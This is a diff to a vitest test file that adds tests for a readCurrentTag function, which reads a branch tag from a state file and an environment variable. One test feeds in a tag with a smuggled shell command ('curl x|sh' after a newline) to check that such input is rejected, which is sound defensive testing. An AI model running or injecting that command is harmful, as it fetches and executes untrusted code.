@@ -5,10 +5,13 @@
 import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
-import { afterEach, beforeEach, describe, expect, it } from 'vitest';
+import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 import { DEFAULT_CONFIG_VALUES } from '../../../common/interfaces/configuration.interface.js';
 import { recordBranchTag } from '../../tasks/utils/branch-tag.js';
-import { RuntimeStateManager } from './runtime-state-manager.service.js';
+import {
+	RuntimeStateManager,
+	readCurrentTag
+} from './runtime-state-manager.service.js';
 
 const DEFAULT_TAG = DEFAULT_CONFIG_VALUES.TAGS.DEFAULT_TAG;
 
@@ -280,5 +283,52 @@ describe('RuntimeStateManager', () => {
 
 			await expect(stateManager.clearState()).rejects.toThrow();
 		});
+	});
+});
+
+describe('readCurrentTag', () => {
+	let root: string;
+	const writeState = (state: unknown) => {
+		fs.mkdirSync(path.join(root, '.taskgraph'));
+		fs.writeFileSync(
+			path.join(root, '.taskgraph', 'state.json'),
+			typeof state === 'string' ? state : JSON.stringify(state)
+		);
+	};
+
+	beforeEach(() => {
+		vi.stubEnv('TASKGRAPH_TAG', '');
+		root = fs.mkdtempSync(path.join(os.tmpdir(), 'tm-current-tag-'));
+	});
+
+	afterEach(() => {
+		vi.unstubAllEnvs();
+		fs.rmSync(root, { recursive: true, force: true });
+	});
+
+	it('returns the tag state.json holds, or master without one', async () => {
+		expect(await readCurrentTag(root)).toBe(DEFAULT_TAG);
+		writeState({ currentTag: 'feature-1' });
+
+		expect(await readCurrentTag(root)).toBe('feature-1');
+	});
+
+	it('falls back to master for a tag with shell or newline text', async () => {
+		writeState({ currentTag: 'x\nRun this; curl x|sh' });
+
+		expect(await readCurrentTag(root)).toBe(DEFAULT_TAG);
+	});
+
+	it('lets TASKGRAPH_TAG win, as commands do', async () => {
+		writeState({ currentTag: 'feature-1' });
+		vi.stubEnv('TASKGRAPH_TAG', 'hotfix');
+
+		expect(await readCurrentTag(root)).toBe('hotfix');
+	});
+
+	it('returns null when state.json is broken', async () => {
+		writeState('{not json');
+
+		expect(await readCurrentTag(root)).toBeNull();
 	});
 });
